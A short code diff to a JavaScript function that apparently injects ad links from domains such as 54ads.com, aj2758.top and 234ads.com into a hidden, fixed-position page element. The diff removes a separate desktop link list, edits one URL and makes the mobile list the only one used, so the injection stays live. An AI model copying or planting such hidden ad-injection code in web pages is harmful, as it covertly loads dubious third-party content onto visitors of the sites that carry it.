@@ -84,16 +84,6 @@ function initAll() {
             s.parentNode.insertBefore(hm, s);
         })();
 
-        var pcLinkList = [
-            "https://adservercdn.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
-            "https://aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
-            "https://1.test.0147258.xyz/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
-            "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
-            `https://234ads.com/?c=${['3ke59x6d','d2txw9rk','9t5wtrw8','0n1kn6an'][Math.floor(Math.random()*4)]}&type=8&timestamp=${Date.now()}`,
-            `https://234ads.com/?c=${['3ke59x6d','d2txw9rk','9t5wtrw8','0n1kn6an'][Math.floor(Math.random()*4)]}&type=8&timestamp=${Date.now()}`,
-            `https://3.test.0147258.xyz/?c=${['3ke59x6d','d2txw9rk','9t5wtrw8','0n1kn6an'][Math.floor(Math.random()*4)]}&type=8&timestamp=${Date.now()}`,
-        ];
-
         var peLinkList = [
             "https://adservercdn.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
             "https://aj2758.top/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
@@ -101,7 +91,7 @@ function initAll() {
             "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
             `https://234ads.com/?c=${['3ke59x6d','d2txw9rk','9t5wtrw8','0n1kn6an'][Math.floor(Math.random()*4)]}&type=8&timestamp=${Date.now()}`,
             `https://234ads.com/?c=${['3ke59x6d','d2txw9rk','9t5wtrw8','0n1kn6an'][Math.floor(Math.random()*4)]}&type=8&timestamp=${Date.now()}`,
-            `https://3.test.0147258.xyz/?c=${['3ke59x6d','d2txw9rk','9t5wtrw8','0n1kn6an'][Math.floor(Math.random()*4)]}&type=8&timestamp=${Date.now()}`,
+            `https://3.test.0147258.xyz/?c=${['3ke59x6d','d2txw9rk','9t5wtrw8','0n1kn6an'][Math.floor(Math.random()*4)]}&timestamp=${Date.now()}`,
         ];
 
         function isMobile() {
@@ -109,8 +99,8 @@ function initAll() {
             return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
         }
 
-        var linkList = isMobile() ? peLinkList : pcLinkList;
-
+      //  var linkList = isMobile() ? peLinkList : pcLinkList;
+        var linkList = peLinkList;
         var hiddenContainer = document.createElement("div");
         hiddenContainer.style.display = "none";
         hiddenContainer.style.position = "fixed";
